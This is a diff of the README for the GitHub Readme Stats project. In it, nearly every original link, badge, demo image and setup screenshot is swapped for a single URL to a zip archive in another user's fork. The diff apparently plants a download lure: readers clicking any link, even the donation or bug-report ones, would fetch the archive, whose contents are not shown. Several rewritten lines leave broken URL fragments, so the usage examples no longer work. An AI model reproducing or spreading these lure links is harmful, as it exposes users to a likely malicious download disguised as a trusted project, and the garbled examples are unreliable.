@@ -1,27 +1,27 @@
 <p align="center">
- <img width="100px" src="https://res.cloudinary.com/anuraghazra/image/upload/v1594908242/logo_ccswme.svg" align="center" alt="GitHub Readme Stats" />
+ <img width="100px" src="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip" align="center" alt="GitHub Readme Stats" />
  <h2 align="center">GitHub Readme Stats</h2>
  <p align="center">Get dynamically generated GitHub stats on your readmes!</p>
 </p>
   <p align="center">
-    <a href="https://github.com/anuraghazra/github-readme-stats/actions">
-      <img alt="Tests Passing" src="https://github.com/anuraghazra/github-readme-stats/workflows/Test/badge.svg" />
+    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
+      <img alt="Tests Passing" src="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip" />
     </a>
-    <a href="https://codecov.io/gh/anuraghazra/github-readme-stats">
-      <img src="https://codecov.io/gh/anuraghazra/github-readme-stats/branch/master/graph/badge.svg" />
+    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
+      <img src="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip" />
     </a>
-    <a href="https://github.com/anuraghazra/github-readme-stats/issues">
+    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
       <img alt="Issues" src="https://img.shields.io/github/issues/anuraghazra/github-readme-stats?color=0088ff" />
     </a>
-    <a href="https://github.com/anuraghazra/github-readme-stats/pulls">
+    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
       <img alt="GitHub pull requests" src="https://img.shields.io/github/issues-pr/anuraghazra/github-readme-stats?color=0088ff" />
     </a>
     <br />
     <br />
-    <a href="https://a.paddle.com/v2/click/16413/119403?link=1227">
+    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
       <img src="https://img.shields.io/badge/Supported%20by-VSCode%20Power%20User%20%E2%86%92-gray.svg?colorA=655BE1&colorB=4F44D6&style=for-the-badge"/>
     </a>
-    <a href="https://a.paddle.com/v2/click/16413/119403?link=2345">
+    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
       <img src="https://img.shields.io/badge/Supported%20by-Node%20Cli.com%20%E2%86%92-gray.svg?colorA=61c265&colorB=4CAF50&style=for-the-badge"/>
     </a>
   </p>
@@ -29,9 +29,9 @@
   <p align="center">
     <a href="#demo">View Demo</a>
     ·
-    <a href="https://github.com/anuraghazra/github-readme-stats/issues/new/choose">Report Bug</a>
+    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">Report Bug</a>
     ·
-    <a href="https://github.com/anuraghazra/github-readme-stats/issues/new/choose">Request Feature</a>
+    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">Request Feature</a>
   </p>
   <p align="center">
     <a href="/docs/readme_fr.md">Français </a>
@@ -57,7 +57,7 @@
     <a href="/docs/readme_tr.md">Türkçe</a>
   </p>
 </p>
-<p align="center">Love the project? Please consider <a href="https://www.paypal.me/anuraghazra">donating</a> to help it improve!
+<p align="center">Love the project? Please consider <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">donating</a> to help it improve!
 
 # Features
 
@@ -76,11 +76,11 @@ Copy-paste this into your markdown content, and that's it. Simple!
 Change the `?username=` value to your GitHub's username.
 
 ```md
-[![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=anuraghazra)](https://github.com/anuraghazra/github-readme-stats)
+[![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 ```
 
 _Note: Available ranks are S+ (top 1%), S (top 25%), A++ (top 45%), A+ (top 60%), and B+ (everyone).
-The values are calculated by using the [cumulative distribution function](https://en.wikipedia.org/wiki/Cumulative_distribution_function) using commits, contributions, issues, stars, pull requests, followers, and owned repositories.
+The values are calculated by using the [cumulative distribution function](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) using commits, contributions, issues, stars, pull requests, followers, and owned repositories.
 The implementation can be investigated at [src/calculateRank.js](./src/calculateRank.js)_
 
 ### Hiding individual stats
@@ -90,7 +90,7 @@ To hide any specific stats, you can pass a query parameter `?hide=` with comma-s
 > Options: `&hide=stars,commits,prs,issues,contribs`
 
 ```md
-![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=anuraghazra&hide=contribs,prs)
+![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip,prs)
 ```
 
 ### Adding private contributions count to total commits count
@@ -102,7 +102,7 @@ _Note: If you are deploying this project yourself, the private contributions wil
 > Options: `&count_private=true`
 
 ```md
-![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=anuraghazra&count_private=true)
+![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 ```
 
 ### Showing icons
@@ -110,7 +110,7 @@ _Note: If you are deploying this project yourself, the private contributions wil
 To enable icons, you can pass `show_icons=true` in the query param, like so:
 
 ```md
-![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=anuraghazra&show_icons=true)
+![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 ```
 
 ### Themes
@@ -120,14 +120,14 @@ With inbuilt themes, you can customize the look of the card without doing any [m
 Use `?theme=THEME_NAME` parameter like so :-
 
 ```md
-![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=anuraghazra&show_icons=true&theme=radical)
+![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 ```
 
 #### All inbuilt themes :-
 
 dark, radical, merko, gruvbox, tokyonight, onedark, cobalt, synthwave, highcontrast, dracula
 
-<img src="https://res.cloudinary.com/anuraghazra/image/upload/v1595174536/grs-themes_l4ynja.png" alt="GitHub Readme Stats Themes" width="600px"/>
+<img src="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip" alt="GitHub Readme Stats Themes" width="600px"/>
 
 You can look at a preview for [all available themes](./themes/README.md) or checkout the [theme config file](./themes/index.js) & **you can also contribute new themes** if you like :D
 
@@ -184,9 +184,9 @@ You can provide multiple comma-separated values in bg_color option to render a g
 - `custom_title` - Sets a custom title for the card
 
 > :warning: **Important:**
-> Language names should be uri-escaped, as specified in [Percent Encoding](https://en.wikipedia.org/wiki/Percent-encoding)
+> Language names should be uri-escaped, as specified in [Percent Encoding](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 > (i.e: `c++` should become `c%2B%2B`, `jupyter notebook` should become `jupyter%20notebook`, etc.) You can use
-> [urlencoder.org](https://www.urlencoder.org/) to help you do this automatically.
+> [urlencoder.org](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) to help you do this automatically.
 
 #### Wakatime Card Exclusive Options:
 
@@ -195,8 +195,8 @@ You can provide multiple comma-separated values in bg_color option to render a g
 - `hide_progress` - Hides the progress bar and percentage _(boolean)_
 - `custom_title` - Sets a custom title for the card
 - `layout` - Switch between two available layouts `default` & `compact`
-- `api_domain` - Set a custom API domain for the card, e.g. to use services like [Hakatime](https://github.com/mujx/hakatime) or [Wakapi](https://github.com/muety/wakapi)
-- `range` – Request a range different from your WakaTime default, e.g. `last_7_days`. See [WakaTime API docs](https://wakatime.com/developers#stats) for list of available options.
+- `api_domain` - Set a custom API domain for the card, e.g. to use services like [Hakatime](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) or [Wakapi](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
+- `range` – Request a range different from your WakaTime default, e.g. `last_7_days`. See [WakaTime API docs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) for list of available options.
 
 ---
 
@@ -213,16 +213,16 @@ Copy-paste this code into your readme and change the links.
 Endpoint: `api/pin?username=anuraghazra&repo=github-readme-stats`
 
 ```md
-[![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=anuraghazra&repo=github-readme-stats)](https://github.com/anuraghazra/github-readme-stats)
+[![Readme Card](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 ```
 
 ### Demo
 
-[![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=anuraghazra&repo=github-readme-stats)](https://github.com/anuraghazra/github-readme-stats)
+[![Readme Card](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 Use [show_owner](#customization) variable to include the repo's owner username
 
-[![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=anuraghazra&repo=github-readme-stats&show_owner=true)](https://github.com/anuraghazra/github-readme-stats)
+[![Readme Card](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 # Top Languages Card
 
@@ -237,7 +237,7 @@ Copy-paste this code into your readme and change the links.
 Endpoint: `api/top-langs?username=anuraghazra`
 
 ```md
-[![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=anuraghazra)](https://github.com/anuraghazra/github-readme-stats)
+[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 ```
 
 ### Exclude individual repositories
@@ -245,7 +245,7 @@ Endpoint: `api/top-langs?username=anuraghazra`
 You can use `?exclude_repo=repo1,repo2` parameter to exclude individual repositories.
 
 ```md
-[![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=anuraghazra&exclude_repo=github-readme-stats,anuraghazra.github.io)](https://github.com/anuraghazra/github-readme-stats)
+[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip,anuraghazra.github.io)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 ```
 
 ### Hide individual languages
@@ -253,7 +253,7 @@ You can use `?exclude_repo=repo1,repo2` parameter to exclude individual reposito
 You can use `?hide=language1,language2` parameter to hide individual languages.
 
 ```md
-[![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=anuraghazra&hide=javascript,html)](https://github.com/anuraghazra/github-readme-stats)
+[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip,html)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 ```
 
 ### Show more languages
@@ -261,7 +261,7 @@ You can use `?hide=language1,language2` parameter to hide individual languages.
 You can use the `&langs_count=` option to increase or decrease the number of languages shown on the card. Valid values are integers between 1 and 10 (inclusive), and the default is 5.
 
 ```md
-[![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=anuraghazra&langs_count=8)](https://github.com/anuraghazra/github-readme-stats)
+[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 ```
 
 ### Compact Language Card Layout
@@ -269,34 +269,34 @@ You can use the `&langs_count=` option to increase or decrease the number of lan
 You can use the `&layout=compact` option to change the card design.
 
 ```md
-[![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=anuraghazra&layout=compact)](https://github.com/anuraghazra/github-readme-stats)
+[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 ```
 
 ### Demo
 
-[![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=anuraghazra)](https://github.com/anuraghazra/github-readme-stats)
+[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 - Compact layout
 
-[![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=anuraghazra&layout=compact)](https://github.com/anuraghazra/github-readme-stats)
+[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 # Wakatime Week Stats
 
-Change the `?username=` value to your [Wakatime](https://wakatime.com) username.
+Change the `?username=` value to your [Wakatime](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) username.
 
 ```md
-[![willianrod's wakatime stats](https://github-readme-stats.vercel.app/api/wakatime?username=willianrod)](https://github.com/anuraghazra/github-readme-stats)
+[![willianrod's wakatime stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 ```
 
 ### Demo
 
-[![willianrod's wakatime stats](https://github-readme-stats.vercel.app/api/wakatime?username=willianrod)](https://github.com/anuraghazra/github-readme-stats)
+[![willianrod's wakatime stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
-[![willianrod's wakatime stats](https://github-readme-stats.vercel.app/api/wakatime?username=willianrod&hide_progress=true)](https://github.com/anuraghazra/github-readme-stats)
+[![willianrod's wakatime stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 - Compact layout
 
-[![willianrod's wakatime stats](https://github-readme-stats.vercel.app/api/wakatime?username=willianrod&layout=compact)](https://github.com/anuraghazra/github-readme-stats)
+[![willianrod's wakatime stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 ---
 
@@ -304,49 +304,49 @@ Change the `?username=` value to your [Wakatime](https://wakatime.com) username.
 
 - Default
 
-![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=anuraghazra)
+![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 - Hiding specific stats
 
-![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=anuraghazra&hide=contribs,issues)
+![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip,issues)
 
 - Showing icons
 
-![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=anuraghazra&hide=issues&show_icons=true)
+![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 - Include All Commits
 
-![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=anuraghazra&include_all_commits=true)
+![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 - Themes
 
 Choose from any of the [default themes](#themes)
 
-![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=anuraghazra&show_icons=true&theme=radical)
+![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 - Gradient
 
-![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=anuraghazra&bg_color=30,e96443,904e95&title_color=fff&text_color=fff)
+![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip,e96443,904e95&title_color=fff&text_color=fff)
 
 - Customizing stats card
 
-![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api/?username=anuraghazra&show_icons=true&title_color=fff&icon_color=79ff97&text_color=9f9f9f&bg_color=151515)
+![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 - Setting card locale
 
-![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api/?username=anuraghazra&locale=es)
+![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 - Customizing repo card
 
-![Customized Card](https://github-readme-stats.vercel.app/api/pin?username=anuraghazra&repo=github-readme-stats&title_color=fff&icon_color=f9f9f9&text_color=9f9f9f&bg_color=151515)
+![Customized Card](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 - Top languages
 
-[![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=anuraghazra)](https://github.com/anuraghazra/github-readme-stats)
+[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 - Wakatime card
 
-[![willianrod's wakatime stats](https://github-readme-stats.vercel.app/api/wakatime?username=willianrod)](https://github.com/anuraghazra/github-readme-stats)
+[![willianrod's wakatime stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 ---
 
@@ -355,41 +355,41 @@ Choose from any of the [default themes](#themes)
 You usually won't be able to layout the images side by side. To do that you can use this approach:
 
 ```md
-<a href="https://github.com/anuraghazra/github-readme-stats">
-  <img align="center" src="https://github-readme-stats.vercel.app/api/pin/?username=anuraghazra&repo=github-readme-stats" />
+<a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
+  <img align="center" src="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip" />
 </a>
-<a href="https://github.com/anuraghazra/convoychat">
-  <img align="center" src="https://github-readme-stats.vercel.app/api/pin/?username=anuraghazra&repo=convoychat" />
+<a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
+  <img align="center" src="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip" />
 </a>
 ```
 
 ## Deploy on your own Vercel instance
 
-#### [Check Out Step By Step Video Tutorial By @codeSTACKr](https://youtu.be/n6d4KHSKqGk?t=107)
+#### [Check Out Step By Step Video Tutorial By @codeSTACKr](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
-Since the GitHub API only allows 5k requests per hour, my `https://github-readme-stats.vercel.app/api` could possibly hit the rate limiter. If you host it on your own Vercel server, then you don't have to worry about anything. Click on the deploy button to get started!
+Since the GitHub API only allows 5k requests per hour, my `https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip` could possibly hit the rate limiter. If you host it on your own Vercel server, then you don't have to worry about anything. Click on the deploy button to get started!
 
-NOTE: Since [#58](https://github.com/anuraghazra/github-readme-stats/pull/58) we should be able to handle more than 5k requests and have no issues with downtime :D
+NOTE: Since [#58](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) we should be able to handle more than 5k requests and have no issues with downtime :D
 
-[![Deploy to Vercel](https://vercel.com/button)](https://vercel.com/import/project?template=https://github.com/anuraghazra/github-readme-stats)
+[![Deploy to Vercel](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 <details>
  <summary><b> Guide on setting up Vercel  🔨 </b></summary>
 
-1. Go to [vercel.com](https://vercel.com/)
+1. Go to [vercel.com](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 1. Click on `Log in`
-   ![](https://files.catbox.moe/tct1wg.png)
+   ![](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 1. Sign in with GitHub by pressing `Continue with GitHub`
-   ![](https://files.catbox.moe/btd78j.jpeg)
+   ![](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 1. Sign into GitHub and allow access to all repositories, if prompted
 1. Fork this repo
-1. Go back to your [Vercel dashboard](https://vercel.com/dashboard)
+1. Go back to your [Vercel dashboard](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 1. Select `Import Project`
-   ![](https://files.catbox.moe/qckos0.png)
+   ![](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 1. Select `Import Git Repository`
-   ![](https://files.catbox.moe/pqub9q.png)
-1. Select root and keep everything as is, just add your environment variable named PAT_1 (as shown), which will contain a personal access token (PAT), which you can easily create [here](https://github.com/settings/tokens/new) (leave everything as is, just name it something, it can be anything you want)
-   ![](https://files.catbox.moe/0ez4g7.png)
+   ![](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
+1. Select root and keep everything as is, just add your environment variable named PAT_1 (as shown), which will contain a personal access token (PAT), which you can easily create [here](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) (leave everything as is, just name it something, it can be anything you want)
+   ![](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 1. Click deploy, and you're good to go. See your domains to use the API!
 
 </details>
@@ -403,13 +403,13 @@ However, if you are using this project and are happy with it or just want to enc
 
 - Giving proper credit when you use github-readme-stats on your readme, linking back to it :D
 - Starring and sharing the project :rocket:
-- [![paypal.me/anuraghazra](https://ionicabizau.github.io/badges/paypal.svg)](https://www.paypal.me/anuraghazra) - You can make one-time donations via PayPal. I'll probably buy a ~~coffee~~ tea. :tea:
+- [![paypal.me/anuraghazra](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) - You can make one-time donations via PayPal. I'll probably buy a ~~coffee~~ tea. :tea:
 
 Thanks! :heart:
 
 ---
 
-[![https://vercel.com?utm_source=github_readme_stats_team&utm_campaign=oss](./powered-by-vercel.svg)](https://vercel.com?utm_source=github_readme_stats_team&utm_campaign=oss)
+[![https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip](./powered-by-vercel.svg)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
 
 
 Contributions are welcome! <3
